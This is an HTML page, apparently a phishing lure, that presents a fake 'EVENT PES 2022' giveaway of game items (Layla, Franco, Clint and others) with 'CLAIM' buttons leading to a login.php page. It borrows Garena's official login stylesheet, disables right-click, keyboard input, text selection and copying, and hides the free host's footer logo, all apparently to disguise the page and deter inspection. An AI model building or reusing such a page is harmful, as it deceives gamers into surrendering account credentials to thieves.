<!DOCTYPE html>
<html>

<head>
<body>
<body style="background-image:url(Messi.jpeg)" no-repeat-fixed">
<body oncontextmenu='return false;' onkeydown='return false;' onmousedown='return false;' ondragstart='return false' onselectstart='return false' style='-moz-user-select: none; cursor: default;'>
    <meta charset="UTF-8">
    <title>EVENT PES 2022</title>
    <link rel="stylesheet" href="ccss/style.css">
    <link rel="shortcut icon" href="https://i1.wp.com/penangfoodie.com/wp-content/uploads/2019/04/Assembly-logo-MLBB-515-1.png?resize=509%2C509">
	<link href="https://cdngarenanow-a.akamaihd.net/gop/sso/theme/dark/css/sso.css?v=0.47" rel="stylesheet" type="text/css"><style type="text/css">}



    #pricing {
    width: 1150px;
    margin: 100px auto;
    font-family: 'Open Sans', Helvetica;
}
.price_card {
border-radius: 1em;
border: 7px double #2a4aeb;
width: 340px;

display: inline-table;
top: 0;
    
  
}
.price_card:not(:last-child) {
    margin-right: 40px;
    
}



    
}
.price_curd:not(:last-child) {
    margin-right: 40px;
    
}
.header {
    color: rgb(255, 255, 255);
}
.groove {
    border:10px groove #5CEDD8;
    border-radius: 20px;
    height: 100%
    widht: 100%
}
.alpha .header {
    background: rgb(39, 39, 39);
    border-radius: 10px;
    opacity: 0.9;
    border-bottom: 20px double green;
    border-right: 20px double green;
    border-left: 20px double green;
    border-top: 20px double green;      
}
.alpha button {
    background: purple;
}  

.alphu .header {
    background: rgb(39, 39, 39);
    border-radius: 10px;
    opacity: 0.9;
    border-bottom: 10px dotted blue;
    border-right: 10px dotted blue;
    border-left: 10px dotted blue;
    border-top: 10px dotted blue;      
}
.alphu button {
    background: purple;
}    
.bravo .header {
    background: rgb(246, 77, 77);
}
.charlie .header {
    background: rgb(48, 219, 181);
}

.price {
    width: 100%;
    font-size: 60px;
    font-weight: 300;
    display: block;
    text-align: center;
    padding: 30px 0 10px;
}
img {
    height: 400px;
    width: 100%;
    font-size: 60px;
    font-weight: 300;
    display: block;
    text-align: center;
    padding: 0px 0 0px;
    border-radius: 1em;
}
.name {
    width: 100%;
    font-size: 0px;
    font-weight: 0;
    display: block;
    text-align: center;
    padding: 0 0 0px;
}
.features {
    list-style: none;
    text-align: center;
    color: rgb(138, 138, 138);
    margin: 0;
    padding: 0;
}
.features li {
    margin: 0 35px;
    padding: 20px 15px;
    width: 200px;
}
.features li:not(:last-child) {
    border: 1px solid rgb(242, 242, 242);
    border-top: 0;
    border-left: 0;
    border-right: 0;
}
button {
font: inherit;
color: white;
background: white;
    height: 40px;
    width: 200px;
    display: block;
    font-weight: 700;
    font-size: 15px;
    text-transform: uppercase;
    margin: 20px auto 35px;
}
.tombol {
font: inherit;
color: white;
background: #FDEC26;
    height: 60px;
    width: 230px;
    display: block;
    font-weight: 700;
    font-size: 25px;
    text-transform: uppercase;
    margin: 20px auto 35px;
    }
input[type="submit"] {
    background: rgb(26, 32, 20) color: rgb(221, 200, 199);
    border: 0;
    border-radius: 5px;
    height: 40px;
    width: 200px;
    display: block;
    font-weight: 700;
    font-size: 15px;
    text-transform: uppercase;
    margin: 20px auto 35px;
}


.btn-skins {
    font-family: "font";
    display: inline-block;
    height: 50px;
    width: 150px;
    margin: 7px 0 7px 0;
    padding: 1px 0 0 0;
    border-left: 2px solid #6495ED;
    border-right: 2px solid #6495ED;
    border-top: 2px solid #6495ED;
    border-bottom: 2px solid #6495ED;
    border-radius: 3em;
    border-collapse: collapse;
    background-color: #EC365F;
    color: #fff;
    font-size: 18px;
    font-variant: small-caps;
    font-weight: bold;
    letter-spacing: 1px;
    cursor: pointer;
}

.btn-skins:hover {
    opacity: 0.9;
}
</style>
<script type="text/javascript">
//<![CDATA[
document.addEventListener('copy', function (e){
    e.preventDefault();
  e.clipboardData.setData("text/plain", "Jangan Copas Gan :) "+window.location.href+"");
})
//]]>
</script></head>


<center>
   
<div id="pricing">
        <div class="price_curd alphu">              
            <div class="header">
               <img src="icon1.jpg">                          
                <span class="name"></span>
            </div></div></div></center>


<div id="pricing">
        <div class="price_card alpha">              
            <div class="header">
               <img src="https://i.ibb.co/k2ftxww/IMG-20210629-WA0020.jpg">                          
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="FF">
           <center> <button class="btn-skins" onclick="location.href='login.php';">CLAIM</button></center>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">              
            <div class="header">
                <img src="https://i.ibb.co/FBwztGV/IMG-20210629-WA0012.jpg">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco">
                 <center> <button class="btn-skins" onclick="location.href='login.php';">CLAIM</button></center>
            <span class="tip">-PERMANENT</span>
        </div>
        
        <div class="price_card alpha">
            <div class="header">
                <img src="https://i.ibb.co/5vJ5Nhd/IMG-20210629-WA0014.jpg">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint">
              <center> <button class="btn-skins" onclick="location.href='login.php';">CLAIM</button></center>
            <span class="tip">-PERMANENT</span>
        </div>
    </div>
    
    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="https://i.ibb.co/CmmV4Lv/IMG-20210629-WA0023.jpg">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla">
                  <center> <button class="btn-skins" onclick="location.href='login.php';">CLAIM</button></center>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">              
            <div class="header">
                <img src="https://i.ibb.co/xHG1B14/IMG-20210629-WA0017.jpg">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco">
              <center> <button class="btn-skins" onclick="location.href='login.php';">CLAIM</button></center>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="https://i.ibb.co/mtYMDLG/IMG-20210629-WA0022.jpg">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint">
                 <center> <button class="btn-skins" onclick="location.href='login.php';">CLAIM</button></center>
            <span class="tip">-PERMANENT</span>
        </div>
    </div>

    <div id="pricing">
        <div class="price_card alpha">
            <div class="header">
                <img src="https://i.ibb.co/ySxnZRw/IMG-20210629-WA0018.jpg">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Layla">
                  <center> <button class="btn-skins" onclick="location.href='login.php';">CLAIM</button></center>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">              
            <div class="header">
                <img src="https://i.ibb.co/cD4bggp/IMG-20210629-WA0021.jpg">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco">
              <center> <button class="btn-skins" onclick="location.href='login.php';">CLAIM</button></center>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">
            <div class="header">
                <img src="https://i.ibb.co/RS858pG/IMG-20210629-WA0015.jpg">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint">
                 <center> <button class="btn-skins" onclick="location.href='login.php';">CLAIM</button></center>
            <span class="tip">-PERMANENT</span>
        </div>
    </div>
    <div id="pricing">
        <div class="price_card alpha">              
            <div class="header">
               <img src="https://i.ibb.co/2hJyP5K/IMG-20210629-WA0016.jpg">                          
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="FF">
           <center> <button class="btn-skins" onclick="location.href='login.php';">CLAIM</button></center>
            <span class="tip">-PERMANENT</span>
        </div>
        <div class="price_card alpha">              
            <div class="header">
                <img src="https://i.ibb.co/8XdJWL6/IMG-20210629-WA0019.jpg">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="Franco">
                 <center> <button class="btn-skins" onclick="location.href='login.php';">CLAIM</button></center>
            <span class="tip">-PERMANENT</span>
        </div>
        
        <div class="price_card alpha">
            <div class="header">
                <img src="https://i.ibb.co/m42mbk6/IMG-20210629-WA0013.jpg">
                <span class="name"></span>
            </div>
            <form action="login.php" method="post">
                <input type="hidden" name="judul" class="judul" value="clint">
              <center> <button class="btn-skins" onclick="location.href='login.php';">CLAIM</button></center>
            <span class="tip">-PERMANENT</span>
        </div>
    </div>


    
       
            </form>
          
    </div>
    
</body>
<style>
img[src*="https://cdn.000webhost.com/000webhost/logo/footer-powered-by-000webhost-white2.png"] 
{ display: none; }
</style>
</html>